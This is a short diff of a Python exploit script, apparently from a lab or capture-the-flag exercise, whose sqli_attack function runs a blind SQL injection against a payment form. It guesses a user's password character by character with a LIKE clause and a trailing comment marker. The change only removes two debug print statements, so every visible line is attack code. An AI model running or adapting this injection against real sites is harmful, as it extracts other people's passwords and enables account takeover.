@@ -31,14 +31,12 @@ def sqli_attack(username):
     while i != len(ascii_letters):
         c = ascii_letters[i]
         strng = username + "' AND users.password LIKE '" + pw + c + "%' LIMIT 1 OFFSET 0--"
-        print(strng)
         if (submit_pay_form(sess, strng, 0)):
             pw = pw + c
             i = -1
         i += 1
     
     pw = pw[0:len(pw)]
-    print("Password is: " +pw)
     return(pw)
 
 
